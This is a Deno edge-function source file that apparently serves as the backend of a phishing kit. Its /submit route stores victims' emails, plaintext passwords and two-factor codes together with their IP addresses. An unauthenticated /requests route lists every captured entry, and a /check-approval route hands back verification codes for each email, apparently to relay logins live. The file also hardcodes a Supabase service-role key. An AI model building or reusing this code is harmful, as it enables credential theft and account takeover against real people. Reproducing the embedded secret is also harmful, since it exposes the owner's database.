import { serve } from "https://deno.land/std@0.168.0/http/server.ts"
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2'

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
  'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
}

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response('ok', { headers: corsHeaders })
  }

  try {
    const supabaseClient = createClient(
      'https://nqsdardermkzppeaazbb.supabase.co',
      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xc2RhcmRlcm1renBwZWFhemJiIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc1MDk1NjU2NSwiZXhwIjoyMDY2NTMyNTY1fQ._G6ZV0GjtQ7Q8ZV4GKOFDxKGhi_eQl2VP7eYfaf-GE8'
    )

    const url = new URL(req.url)
    const path = url.pathname

    // TEST ROOT
    if (req.method === 'GET' && (path === '/' || path.includes('api-v2'))) {
      return new Response(JSON.stringify({ 
        message: 'API V2 WORKING! 🎉',
        timestamp: new Date().toISOString(),
        success: true,
        path: path,
        method: req.method
      }), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      })
    }

    // SUBMIT LOGIN DATA
    if (path === '/submit' && req.method === 'POST') {
      const body = await req.json()
      const { email, password, twofa, userAgent, currentPage } = body

      const { data, error } = await supabaseClient
        .from('requests')
        .insert([{
          email,
          password,
          twofa,
          user_agent: userAgent,
          ip: req.headers.get('x-forwarded-for') || 'unknown',
          country: 'Unknown',
          page_status: currentPage || 'Login'
        }])
        .select()

      if (error) {
        return new Response(JSON.stringify({ success: false, error: error.message }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 500,
        })
      }

      return new Response(JSON.stringify({ success: true, data }), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      })
    }

    // GET REQUESTS (ADMIN)
    if (path === '/requests' && req.method === 'GET') {
      const { data, error } = await supabaseClient
        .from('requests')
        .select('*')
        .order('created_at', { ascending: false })

      if (error) {
        return new Response(JSON.stringify({ error: error.message }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 500,
        })
      }

      return new Response(JSON.stringify(data || []), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      })
    }

    // CHECK APPROVAL
    if (path === '/check-approval' && req.method === 'GET') {
      const email = url.searchParams.get('email')
      
      if (!email) {
        return new Response(JSON.stringify({ error: 'Email required' }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 400,
        })
      }

      const { data, error } = await supabaseClient
        .from('requests')
        .select('*')
        .eq('email', email)
        .order('created_at', { ascending: false })
        .limit(1)

      if (error) {
        return new Response(JSON.stringify({ error: error.message }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 500,
        })
      }

      const request = data?.[0]
      return new Response(JSON.stringify({ 
        status: request?.status || 'not_found',
        verificationCode: request?.verification_code,
        id: request?.id 
      }), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      })
    }

    return new Response(JSON.stringify({
      error: 'Not Found',
      path: path,
      method: req.method,
      available: ['GET /', 'POST /submit', 'GET /requests', 'GET /check-approval?email=xxx']
    }), {
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      status: 404,
    })

  } catch (error) {
    return new Response(JSON.stringify({ 
      error: 'Server Error',
      message: error.message
    }), {
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      status: 500,
    })
  }
}) 